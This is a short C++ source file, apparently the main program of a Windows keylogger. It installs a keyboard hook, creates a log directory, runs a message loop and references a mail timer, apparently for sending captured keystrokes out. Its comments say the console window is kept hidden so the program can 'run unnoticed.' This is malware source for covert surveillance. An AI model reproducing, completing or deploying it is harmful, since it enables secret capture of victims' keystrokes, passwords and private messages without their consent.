#include <iostream>
#include <windows.h>
#include "Base64.h";
#include "Helper.h";
#include "Timer.h";
#include "IO.h";
#include "KeyBHook.h";

int main()
{
    MSG msg;
    /*
    We need to avoid raising the console window
    when the program executes, so that the program can run
    unnoticed.
    */  
    IO::MKDir(IO::GetPath(true));
    InstallHook();

    while(GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    /*
    Becuase of this get message its waiting for a message
    to translate and dispatch to the system but won't ever
    get the message therefore not prompt
    */
   MailTimer.Stop();
    return 0;
}